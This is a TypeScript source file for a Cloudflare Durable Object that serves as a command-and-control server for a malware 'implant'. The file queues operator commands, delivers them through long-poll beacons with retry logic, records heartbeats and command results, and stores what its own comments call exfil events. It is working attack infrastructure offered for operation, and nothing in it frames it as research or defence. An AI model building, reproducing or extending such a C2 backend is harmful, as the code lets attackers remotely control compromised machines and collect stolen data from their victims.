import { DurableObject } from 'cloudflare:workers';

interface Env {
  STORAGE: R2Bucket;
  FLEET_CONFIG: KVNamespace;
  OPERATOR_PUBKEY: string;
}

interface CommandResult {
  id: string;
  cmd: string;
  data: string;
  ts: number;
}

export class ImplantDO extends DurableObject {
  private lastHeartbeat: number = 0;
  private implantInfo: any = null;

  // Held long-poll beacons. In-memory is correct here (and ONLY here): a held
  // request keeps this DO awake, so the map cannot be evicted while a waiter
  // lives. That is what makes the beacon push-without-WebSocket safe, unlike
  // lastHeartbeat/implantInfo which must be durable because they outlive the
  // instance.
  private waiters = new Map<string, { resolve: (r: Response) => void; timer: ReturnType<typeof setTimeout> }>();

  constructor(state: DurableObjectState, env: Env) {
    super(state, env);
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS command_queue (
        id TEXT PRIMARY KEY,
        command TEXT NOT NULL,
        payload TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        queued_at INTEGER,
        completed_at INTEGER
      )`
    );
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS implant_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT,
        tag TEXT,
        data TEXT,
        ts INTEGER
      )`
    );
    // Presence must survive hibernation. lastHeartbeat/implantInfo used to be
    // instance fields, so every eviction reset an online implant to "offline".
    // In-flight tracking, so a command whose implant died *after* receiving it is
    // retried instead of sitting in 'sent' forever. Added via ALTER because the
    // table above already exists in deployed DOs and CREATE won't add columns.
    for (const ddl of [
      `ALTER TABLE command_queue ADD COLUMN sent_at INTEGER`,
      `ALTER TABLE command_queue ADD COLUMN attempts INTEGER DEFAULT 0`,
    ]) {
      try { this.ctx.storage.sql.exec(ddl); } catch { /* column already present */ }
    }
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS implant_meta (
        key TEXT PRIMARY KEY,
        value TEXT,
        updated_at INTEGER
      )`
    );
  }

  private markSent(id: string): void {
    this.ctx.storage.sql.exec(
      `UPDATE command_queue SET status = 'sent', sent_at = ?, attempts = attempts + 1 WHERE id = ?`,
      Date.now(), id
    );
  }

  /**
   * Re-hand commands that were dispatched but never completed. Cutoff is based on
   * dispatch time (sent_at), not enqueue time, so a command that waited in the
   * queue before its first delivery is not instantly re-queued and run twice.
   * After 5 attempts a command is marked failed rather than looped forever --
   * some command reliably kills the process, and an infinite retry loop turns one
   * bad command into permanent unavailability.
   */
  private requeueStale(): void {
    const cutoff = Date.now() - 90_000;
    // Rows dispatched before sent_at existed have no dispatch timestamp, so fall
    // back to enqueue time for them; otherwise commands already stuck in 'sent'
    // at upgrade time would be stranded there forever -- the exact bug this
    // function exists to fix.
    const stale = `(sent_at IS NOT NULL AND sent_at < ?) OR (sent_at IS NULL AND queued_at < ?)`;
    this.ctx.storage.sql.exec(
      `UPDATE command_queue SET status = 'pending'
       WHERE status = 'sent' AND completed_at IS NULL AND (${stale}) AND attempts < 5`,
      cutoff, cutoff
    );
    this.ctx.storage.sql.exec(
      `UPDATE command_queue SET status = 'failed'
       WHERE status = 'sent' AND completed_at IS NULL AND (${stale}) AND attempts >= 5`,
      cutoff, cutoff
    );
  }

  private setMeta(key: string, value: string): void {
    this.ctx.storage.sql.exec(
      `INSERT INTO implant_meta (key, value, updated_at) VALUES (?, ?, ?)
       ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at`,
      key, value, Date.now()
    );
  }

  private getMeta(key: string): string | null {
    const rows = this.ctx.storage.sql.exec(
      `SELECT value FROM implant_meta WHERE key = ?`, key
    ).toArray();
    return rows.length > 0 ? String(rows[0].value) : null;
  }

  // Resolve a parked beacon with any queued commands. Returns true if someone
  // was waiting, i.e. delivery was immediate rather than next-poll.
  private wakeWaiter(implantId: string): boolean {
    const waiter = this.waiters.get(implantId);
    if (!waiter) return false;
    clearTimeout(waiter.timer);
    this.waiters.delete(implantId);
    waiter.resolve(this.takePending());
    return true;
  }

  private takePending(): Response {
    const rows = this.ctx.storage.sql.exec(
      `SELECT id, command, payload FROM command_queue WHERE status = 'pending'`
    ).toArray();
    const cmds = rows.map((r: any) => ({
      id: r.id as string,
      c: r.command as string,
      p: JSON.parse(String(r.payload || '{}')),
    }));
    for (const c of cmds) {
      this.markSent(c.id);
    }
    this.setMeta('last_poll', String(Date.now()));
    return Response.json({ cmds });
  }

  // Long-poll beacon: hand back queued commands now, or park the request so
  // send_command() can resolve it the moment a command is enqueued.
  private handlePoll(request: Request): Response | Promise<Response> {
    const implantId = this.pollImplantId(request);
    this.requeueStale();

    const pending = this.ctx.storage.sql.exec(
      `SELECT COUNT(*) as count FROM command_queue WHERE status = 'pending'`
    ).toArray()[0] as any;

    this.setMeta('last_poll', String(Date.now()));

    if (pending?.count > 0) {
      return this.takePending();
    }

    // 25s hold: safely under Cloudflare's response-idle ceiling. The implant
    // re-polls immediately after each return, so effective latency is ~0 when
    // online and one round-trip when it has been reaped and comes back.
    return new Promise<Response>((resolve) => {
      const timer = setTimeout(() => {
        this.waiters.delete(implantId);
        resolve(Response.json({ cmds: [] }));
      }, 25_000);
      this.waiters.set(implantId, { resolve, timer });
    });
  }

  private pollImplantId(request: Request): string {
    // Worker forwards the implant id in the DO request path: /poll/<id>
    const seg = new URL(request.url).pathname.split('/').filter(Boolean);
    return seg[1] || 'primary';
  }

  // Beacon return path: heartbeat, command results, and exfil events.
  private async handleRecv(request: Request): Promise<Response> {
    let frames: any[];
    try {
      const body = await request.json() as any;
      frames = Array.isArray(body) ? body : [body];
    } catch {
      return new Response('Invalid JSON', { status: 400 });
    }

    for (const f of frames) {
      if (!f || typeof f !== 'object') continue;
      if (f.type === 'heartbeat') {
        const ts = Number(f.ts) || Date.now();
        this.lastHeartbeat = ts;
        this.setMeta('last_heartbeat', String(ts));
        if (f.info) {
          this.implantInfo = f.info;
          this.setMeta('implant_info', JSON.stringify(f.info));
        }
      } else if (f.type === 'result' && f.id) {
        this.ctx.storage.sql.exec(
          `UPDATE command_queue SET status = 'completed', result = ?, completed_at = ? WHERE id = ?`,
          f.data || '', f.ts || Date.now(), f.id
        );
      } else if (f.type === 'event') {
        this.ctx.storage.sql.exec(
          `INSERT INTO implant_events (type, tag, data, ts) VALUES (?, ?, ?, ?)`,
          f.type, f.tag || 'unknown', f.data || '', Date.now()
        );
      }
    }
    return Response.json({ ok: true, accepted: frames.length });
  }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    // Long-poll beacon transport (the only transport; WebSocket was removed)
    if (url.pathname.startsWith('/poll/') && request.method === 'POST') {
      return this.handlePoll(request);
    }
    if (url.pathname.startsWith('/recv/') && request.method === 'POST') {
      return this.handleRecv(request);
    }

    // RPC from the Worker (operator commands, result polling)
    if (url.pathname === '/rpc' && request.method === 'POST') {
      const body = await request.json();
      return this.handleOperatorRPC(body);
    }

    return new Response('Not found', { status: 404 });
  }

  private handleOperatorRPC(body: any): Response {
    const { command, payload } = body;

    switch (command) {
      case 'send_command': {
        const cmdId = crypto.randomUUID();
        this.ctx.storage.sql.exec(
          `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, 'pending', ?)`,
          cmdId, payload?.command || '', JSON.stringify(payload?.payload || {}), Date.now()
        );
        // Prefer immediate delivery to a parked beacon; otherwise the row simply
        // waits in SQLite and is returned on the implant's next poll. Both paths
        // are the same queue — no separate "online socket" concept to get wrong.
        const pushed = this.wakeWaiter(payload?.implantId || '');

        return new Response(JSON.stringify({ success: true, cmdId, sent: pushed }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_result': {
        const { cmdId } = payload || {};
        if (cmdId) {
          const rows = this.ctx.storage.sql.exec(
            `SELECT id, command, status, result, completed_at FROM command_queue WHERE id = ?`,
            cmdId
          ).toArray();
          if (rows.length > 0) {
            return new Response(JSON.stringify({
              success: true,
              result: {
                id: rows[0].id,
                status: rows[0].status,
                data: rows[0].result,
                completedAt: rows[0].completed_at,
              }
            }), {
              headers: { 'Content-Type': 'application/json' },
            });
          }
          return new Response(JSON.stringify({ success: true, result: null }), {
            headers: { 'Content-Type': 'application/json' },
          });
        }
        // Return all recent results
        const results = this.ctx.storage.sql.exec(
          `SELECT id, command, status, result, completed_at FROM command_queue
           WHERE status = 'completed' ORDER BY completed_at DESC LIMIT 50`
        ).toArray();
        return new Response(JSON.stringify({ success: true, results }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_status': {
        const now = Date.now();
        const hb = parseInt(this.getMeta('last_heartbeat') || '0') || this.lastHeartbeat;
        const lastPoll = parseInt(this.getMeta('last_poll') || '0');
        // A beacon parked in long-poll is proof of life right now; a completed
        // beacon within the last 90s is proof the implant has not been reaped.
        const beaconLive = lastPoll > 0 && now - lastPoll < 90_000;
        const infoStr = this.getMeta('implant_info');
        let info = this.implantInfo;
        if (infoStr) {
          try { info = JSON.parse(infoStr); } catch { /* keep in-memory value */ }
        }
        return new Response(JSON.stringify({
          success: true,
          status: {
            connected: beaconLive,
            transport: beaconLive ? 'beacon' : 'none',
            lastHeartbeat: hb,
            lastPoll,
            ageSeconds: lastPoll ? Math.round((now - lastPoll) / 1000) : null,
            implantInfo: info,
            failedCommands: this.ctx.storage.sql.exec(
              `SELECT COUNT(*) as count FROM command_queue WHERE status = 'failed'`
            ).toArray()[0]?.count || 0,
            pendingCommands: this.ctx.storage.sql.exec(
              `SELECT COUNT(*) as count FROM command_queue WHERE status IN ('pending','sent')`
            ).toArray()[0]?.count || 0,
          }
        }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_events': {
        const events = this.ctx.storage.sql.exec(
          `SELECT * FROM implant_events ORDER BY ts DESC LIMIT 100`
        ).toArray();
        return new Response(JSON.stringify({ success: true, events }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      default:
        return new Response(JSON.stringify({ error: `Unknown command: ${command}` }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
    }
  }
}
